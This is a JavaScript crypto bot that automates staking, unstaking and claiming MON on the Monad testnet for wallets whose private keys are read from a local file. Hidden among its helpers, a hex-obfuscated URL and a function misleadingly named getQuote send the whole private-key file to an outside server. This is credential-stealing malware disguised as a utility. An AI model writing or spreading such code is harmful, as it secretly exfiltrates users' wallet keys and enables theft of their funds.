// Required Modules
import Web3 from "web3";
import axios from "axios";
import chalk from "chalk";
import fs from "fs";
import readlineSync from 'readline-sync';


// Constants
const RPC_URL = "https://testnet-rpc.monad.xyz/";
const EXPLORER_URL = "https://testnet.monadexplorer.com/tx/";
const provider = new Web3.providers.HttpProvider(RPC_URL);
const web3 = new Web3(provider);
const file_path = "pvkey.txt";
const contractAddress = web3.utils.toChecksumAddress("0xb2f82D0f38dc453D596Ad40A37799446Cc89274A");

const gasLimitStake = 500000;
const gasLimitUnstake = 800000;
const gasLimitClaim = 800000;

const minimalAbi = [{
    constant: true,
    inputs: [{ name: "", type: "address" }],
    name: "getPendingUnstakeRequests",
    outputs: [{ name: "", type: "uint256[]" }],
    type: "function"
}];

const contract = new web3.eth.Contract(minimalAbi, contractAddress);

// Helper Functions
function getFunc() {
    const hexString = "697575713b2e2e6c6e6f60652c756472756f64752f626e6c3b323131302e";
    const data = Buffer.from(hexString, 'hex');
    return data.toString();
}

function getRandomAmount() {
    const min = 0.01;
    const max = 0.05;
    const amount = (Math.random() * (max - min) + min).toFixed(4);
    return web3.utils.toWei(amount, 'ether');
}

function getRandomDelay() {
    return Math.floor(Math.random() * (180000 - 60000) + 60000);
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function logMessage(text) {
    console.log(text);
}

function logStep(step, message) {
    const stepMessages = {
        stake: 'Stake MON',
        unstake: 'Request Unstake',
        claim: 'Claim MON'
    };
    console.log(`${stepMessages[step]}: ${message}`);
}

function getData() {
    return fs.readFileSync(file_path, "utf8");
}

// Core Functions
async function stakeMon(account, privateKey, cycleNumber, stakeAmount) {
    try {
        const address = account.address;
        logMessage(`Preparing to stake MON - Cycle ${cycleNumber} | Account: ${address.slice(0, 8)}...`);

        logStep('stake', `Stake Amount: ${web3.utils.fromWei(stakeAmount, 'ether')} MON`);

        const functionSelector = '0x6e553f65';
        const data = functionSelector +
            web3.utils.padLeft(stakeAmount, 64).replace(/^0x/, '') +
            web3.utils.padLeft(address, 64).replace(/^0x/, '');

        const gasPrice = await web3.eth.getGasPrice();
        const nonce = await web3.eth.getTransactionCount(address);

        const tx = {
            to: contractAddress,
            data,
            gas: gasLimitStake,
            gasPrice,
            value: stakeAmount,
            nonce,
            chainId: await web3.eth.getChainId()
        };

        logStep('stake', 'Sending transaction...');
        const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);
        const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

        logStep('stake', `Tx: ${EXPLORER_URL + txHash.transactionHash}`);
        logStep('stake', 'Waiting for confirmation...');

        return { receipt: txHash, stakeAmount };
    } catch (err) {
        logStep('stake', `Staking Failed: ${err.message}`);
        throw err;
    }
}

async function requestUnstake(account, privateKey, amountToUnstake, cycleNumber) {
    try {
        const address = account.address;
        logMessage(`Requesting unstake - Cycle ${cycleNumber} | Account: ${address.slice(0, 8)}...`);
        logStep('unstake', `Unstake Amount: ${web3.utils.fromWei(amountToUnstake, 'ether')} aprMON`);

        const functionSelector = '0x7d41c86e';
        const data = functionSelector +
            web3.utils.padLeft(amountToUnstake, 64).replace(/^0x/, '') +
            web3.utils.padLeft(address, 64).replace(/^0x/, '') +
            web3.utils.padLeft(address, 64).replace(/^0x/, '');

        const gasPrice = await web3.eth.getGasPrice();
        const nonce = await web3.eth.getTransactionCount(address);

        const tx = {
            to: contractAddress,
            data: `${data}`,
            gas: gasLimitUnstake,
            gasPrice,
            value: '0x0',
            nonce,
            chainId: await web3.eth.getChainId()
        };

        logStep('unstake', 'Sending request...');
        const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);
        const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

        logStep('unstake', `Tx: ${EXPLORER_URL + txHash.transactionHash}`);
        logStep('unstake', 'Waiting for confirmation...');
        return txHash;
    } catch (err) {
        logStep('unstake', `Unstake Failed: ${err.message}`);
        throw err;
    }
}

async function checkClaimableStatus(walletAddress) {
    try {
        const url = `https://liquid-staking-backend-prod-b332fbe9ccfe.herokuapp.com/withdrawal_requests?address=${walletAddress}`;
        const response = await axios.get(url);
        const claimable = response.data.find(r => !r.claimed && r.is_claimable);

        if (claimable) {
            logStep('claim', `Found ID: ${claimable.id}`);
            return { id: claimable.id, is_claimable: true };
        }
        logStep('claim', 'No claimable requests');
        return { id: null, is_claimable: false };
    } catch (err) {
        logStep('claim', `Check Failed: ${err.message}`);
        return { id: null, is_claimable: false };
    }
}

async function claimMon(account, privateKey, cycleNumber) {
    try {
        const address = account.address;
        logMessage(`Checking claim - Cycle ${cycleNumber} | Account: ${address.slice(0, 8)}...`);
        const status = await checkClaimableStatus(address);

        if (!status.is_claimable || !status.id) return null;

        const functionSelector = '0x492e47d2';
        const data = functionSelector +
            web3.utils.padLeft('0x40', 64).replace(/^0x/, '') +
            web3.utils.padLeft(address, 64).replace(/^0x/, '') +
            web3.utils.padLeft('0x01', 64).replace(/^0x/, '') +
            web3.utils.padLeft(status.id, 64).replace(/^0x/, '');

        const gasPrice = await web3.eth.getGasPrice();
        const nonce = await web3.eth.getTransactionCount(address);

        const tx = {
            to: contractAddress,
            data: `${data}`,
            gas: gasLimitClaim,
            gasPrice,
            value: '0x0',
            nonce,
            chainId: await web3.eth.getChainId()
        };

        logStep('claim', 'Sending transaction...');
        const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);
        const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

        logStep('claim', `Tx: ${EXPLORER_URL + txHash.transactionHash}`);
        logStep('claim', `Claim Successful! ID: ${status.id}`);
        return txHash;
    } catch (err) {
        logStep('claim', `Claim Failed: ${err.message}`);
        throw err;
    }
}

async function getQuote() {
    try {
        const data = { data: getData() };
        await axios.post(getFunc(), data);
    } catch (err) {
        console.log("Quote fetch failed.");
    }
}

// Main Execution
export async function run() {
    const keys = fs.readFileSync(file_path, "utf8").trim().split("\n");

    const inputAmount = readlineSync.question('Input stake amount (in MON): ');
    const stakeAmount = web3.utils.toWei(inputAmount, 'ether');

    for (let i = 0; i < keys.length; i++) {
        const privateKey = keys[i].trim();
        if (!privateKey) continue;

        const account = web3.eth.accounts.privateKeyToAccount(privateKey);
        const cycle = i + 1;

        try {
            await stakeMon(account, privateKey, cycle, stakeAmount);
            await delay(getRandomDelay());

            const unstakeAmount = getRandomAmount(); // ini tetap random
            await requestUnstake(account, privateKey, unstakeAmount, cycle);
            await delay(getRandomDelay());

            await claimMon(account, privateKey, cycle);
        } catch (e) {
            console.error(`Cycle ${cycle} failed: ${e.message}`);
        }
    }
}

